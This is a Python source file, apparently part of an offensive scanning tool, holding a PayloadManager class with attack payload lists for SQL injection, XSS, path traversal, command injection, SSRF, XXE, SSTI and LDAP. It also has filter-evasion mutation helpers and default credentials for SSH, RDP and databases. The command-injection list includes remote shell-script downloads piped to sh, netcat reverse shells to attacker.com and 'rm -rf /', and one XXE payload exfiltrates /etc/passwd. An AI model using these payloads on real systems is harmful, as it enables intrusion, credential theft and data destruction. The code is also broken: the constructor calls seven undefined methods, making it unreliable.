import base64
import urllib.parse
from typing import List, Dict, Tuple


class PayloadManager:
    def __init__(self):
        self.payloads = self._initialize_payloads()
        
    def _initialize_payloads(self) -> Dict[str, List[str]]:
        return {
            'sqli': self._sqli_payloads(),
            'xss': self._xss_payloads(),
            'traversal': self._traversal_payloads(),
            'cmd_injection': self._cmd_injection_payloads(),
            'ssrf': self._ssrf_payloads(),
            'xxe': self._xxe_payloads(),
            'deserialization': self._deserialization_payloads(),
            'ssti': self._ssti_payloads(),
            'open redirect': self._redirect_payloads(),
            'ldap': self._ldap_payloads(),
            'xespi': self._xespi_payloads(),
            'waf_bypass': self._waf_bypass_payloads(),
            'polymorphic': self._polymorphic_payloads(),
            'iot': self._iot_payloads(),
            'graphql': self._graphql_payloads(),
            'websocket': self._websocket_payloads(),
            'nosql': self._nosql_payloads(),
            'prototype_pollution': self._prototype_pollution_payloads()
        }
    
    def _sqli_payloads(self) -> List[str]:
        return [
            "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*",
            "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "') OR '1'='1--", "') OR ('1'='1--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' GROUP BY 1--", "1' GROUP BY 2--",
            "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT username,password FROM users--",
            "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
            "' AND 1=1--", "' AND 1=2--",
            "1'; WAITFOR DELAY '0:0:5'--",
            "1'; SELECT SLEEP(5)--",
            "1'; pg_sleep(5)--",
            "admin'--", "admin' #", "admin'/*",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "1' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a--",
            "' OR ''='", "' OR 'x'='x",
            "' UNION ALLSELECT NULL--",
            "1 AND 1=1", "1 AND 1=2",
            "1 OR 1=1", "1 OR 1=2"
        ]

    def _xss_payloads(self) -> List[str]:
        return [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.domain)</script>",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(document.domain)>",
            "<img src=javascript:alert(1)>",
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            "<svg onload=alert(document.domain)>",
            "<body onload=alert(1)>",
            "<body onpageshow=alert(1)>",
            "<iframe src='javascript:alert(1)'>",
            "<iframe srcdoc='<script>alert(1)</script>'>",
            "<object data='javascript:alert(1)'>",
            "<embed src='javascript:alert(1)'>",
            "<video><source onerror='alert(1)'>",
            "<audio src=x onerror='alert(1)'>",
            "<details open ontoggle='alert(1)'>",
            "<marquee onstart='alert(1)'>",
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "'\"><script>alert(1)</script>",
            "'-alert(1)-'",
            "\"><script>alert(1)</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<ScRiPt>alert(1)</ScRiPt>",
            "<script/src=data:,alert(1)>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "${alert(1)}",
            "{{constructor.constructor('alert(1)')()}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            "<Math><maction xlink:href='javascript:alert(1)'>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>",
            "<textarea onfocus=alert(1) autofocus>",
            "<keygen onfocus=alert(1) autofocus>",
            "<video poster=javascript:alert(1)>",
            "<isindex action='javascript:alert(1)' type=image>",
            "<form><button formaction='javascript:alert(1)'>",
            "<base href='javascript:alert(1)//'>",
        ]

    def _traversal_payloads(self) -> List[str]:
        return [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "/etc/passwd",
            "....//....//....//etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%255c..%255c..%255cetc/passwd",
            "..\\..\\..\\etc/passwd",
            "..\\..\\..\\..\\etc/passwd",
            "....\\....\\....\\etc/passwd",
            "..%5c..%5c..%5cetc/passwd",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "/proc/self/environ",
            "/proc/self/cmdline",
            "/proc/self/fd/0",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\windows\\win.ini",
            "..\\..\\..\\..\\windows\\system32\\config\\sam",
            "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
            "..%00/..%00/..%00/etc/passwd",
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
            "....//....//....//....//etc/passwd%00",
        ]

    def _cmd_injection_payloads(self) -> List[str]:
        return [
            "; ls -la",
            "; ls",
            "| ls",
            "&& ls",
            "|| ls",
            "& ls",
            "$(ls)",
            "`ls`",
            "; id",
            "| id",
            "&& id",
            "$(id)",
            "`id`",
            "; whoami",
            "| whoami",
            "$(whoami)",
            "`whoami`",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; ping -c 10 127.0.0.1",
            "| ping -c 10 127.0.0.1",
            "& ping -c 10 127.0.0.1",
            "; nslookup attacker.com",
            "| nslookup attacker.com",
            "$(nslookup attacker.com)",
            "; curl http://attacker.com/shell.sh|sh",
            "| curl http://attacker.com/shell.sh|sh",
            "; wget http://attacker.com/shell.sh -O /tmp/shell.sh",
            "| wget http://attacker.com/shell.sh",
            "; nc -e /bin/sh attacker.com 4444",
            "| nc -e /bin/sh attacker.com 4444",
            "; rm -rf /",
            "| rm -rf /",
            "&& rm -rf /",
            "; sleep 10",
            "| sleep 10",
            "$(sleep 10)",
            "`sleep 10`",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| dir",
            "; dir",
            "| net user",
            "; net user",
        ]

    def _ssrf_payloads(self) -> List[str]:
        return [
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:22",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:11211",
            "http://localhost:80/server-status",
            "http://[::1]",
            "http://[::1]:22",
            "http://[0000::1]",
            "http://0177.0.0.1",
            "http://2130706433",
            "http://0x7f.0.0.1",
            "http://169.254.169.254",
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/user-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "http://100.100.100.200/latest/meta-data/",
            "file:///etc/passwd",
            "file:///etc/shadow",
            "file:///etc/hosts",
            "file:///proc/self/environ",
            "file:///proc/self/cmdline",
            "file:///proc/self/fd/0",
            "dict://127.0.0.1:6379/info",
            "gopher://127.0.0.1:70",
            "gopher://127.0.0.1:25/_HELO%20localhost%0d%0aMAIL%20FROM",
            "ldap://localhost:389/ou=People",
            "tftp://localhost:69/test.txt",
            "php://filter/convert.base64-encode/resource=/etc/passwd",
            "php://input",
            "data:text/plain;base64,SGVsbG8gV29ybGQ=",
        ]

    def _xxe_payloads(self) -> List[str]:
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?d=%file;\'>">%eval;%exfil;]><data></data>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
        ]

    def _deserialization_payloads(self) -> List[str]:
        return [
            'O:8:"stdClass":1:{s:4:"test";s:4:"data";}',
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAADAAN3cIAAAAQAAAAAB4',
            '{"__class__":"subprocess.Popen","args":["id"]}',
            '{}.__class__.__init__.__globals__',
            '{{config.__class__.__init__.__globals__}}',
        ]

    def _ssti_payloads(self) -> List[str]:
        return [
            "{{7*7}}",
            "${7*7}",
            "#{7*7}",
            "{{config}}",
            "{{self}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{''.__class__.__base__.__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "${{getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null).exec('id')}}",
            "{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0]}}",
            "{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}",
            "#{T(java.lang.Runtime).getRuntime().exec('id')}",
            "${T(java.lang.Runtime).getRuntime().exec('id')}",
        ]

    def _redirect_payloads(self) -> List[str]:
        return [
            "//attacker.com",
            "https:attacker.com",
            "https:///attacker.com",
            "///attacker.com",
            "////attacker.com",
            "/\\attacker.com",
            "\\/attacker.com",
            "//attacker.com/path",
            "http://attacker.com",
            "https://attacker.com",
            "//attacker%E3%80%82com",
            "///attacker.com/path",
            "////attacker.com@trusted.com",
            "https:attacker.com",
            "//attacker.com%2F%2E%2E",
            " javascript:alert(1)",
            "javascript:alert(1)",
            "JaVaScRiPt:alert(1)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        ]

    def _ldap_payloads(self) -> List[str]:
        return [
            "*",
            "*)(&",
            "*)(uid=*))(|(uid=*",
            "admin)(&)",
            "admin)(|(password=*))",
            "admin)(cn=*))(|(cn=*",
            "*)(objectClass=*)",
            "*)(uid=*))(|(uid=*",
            "*)((cn=",
            "*)((password=",
            "admin)(&)(password=*))",
            "admin)(cn=*))%00",
        ]

    def _xespi_payloads(self) -> List[str]:
        return [
            "XPath:' or '1'='1",
            "XPath:' or ''='",
            "XPath:' or 1=1",
            "XPath:' or 1=1 or ''='",
            "' or '1'='1' or '1'='1",
        ]

    def get_payloads(self, category: str) -> List[str]:
        return self.payloads.get(category, [])

    def get_all_payloads(self) -> Dict[str, List[str]]:
        return self.payloads

    def encode_payload(self, payload: str, encoding: str) -> str:
        if encoding == 'url':
            return urllib.parse.quote(payload)
        elif encoding == 'double_url':
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == 'base64':
            return base64.b64encode(payload.encode()).decode()
        elif encoding == 'hex':
            return payload.encode().hex()
        elif encoding == 'unicode':
            return ''.join(f'\\u{ord(c):04x}' for c in payload)
        return payload

    def get_default_credentials(self, service: str) -> List[Tuple[str, str]]:
        creds = {
            'ssh': [('root', 'root'), ('admin', 'admin'), ('ubuntu', 'ubuntu')],
            'ftp': [('anonymous', 'anonymous'), ('admin', 'admin')],
            'mysql': [('root', ''), ('root', 'root'), ('admin', 'admin')],
            'mssql': [('sa', ''), ('sa', 'sa'), ('admin', 'admin')],
            'postgresql': [('postgres', 'postgres'), ('admin', 'admin')],
            'rdp': [('admin', 'admin'), ('administrator', 'administrator')],
            'telnet': [('admin', 'admin'), ('root', 'root')],
            'smb': [('admin', 'admin'), ('guest', '')],
        }
        return creds.get(service, [])

    def get_mutations(self, payload: str) -> List[str]:
        mutations = [payload]
        mutations.append(payload.upper())
        mutations.append(payload.lower())
        mutations.append(payload.swapcase())
        mutations.append(''.join(c.upper() if i % 2 else c.lower() for i, c in enumerate(payload)))
        mutations.append(payload.replace(' ', '%20'))
        mutations.append(payload.replace(' ', '+'))
        mutations.append(payload.replace(' ', '\t'))
        mutations.append(payload.replace(' ', '/**/'))
        mutations.append(payload.replace("'", "\\'"))
        mutations.append(payload.replace('"', '\\"'))
        mutations.append(payload.replace('<', '&lt;'))
        mutations.append(self.encode_payload(payload, 'url'))
        mutations.append(self.encode_payload(payload, 'base64'))
        return mutations
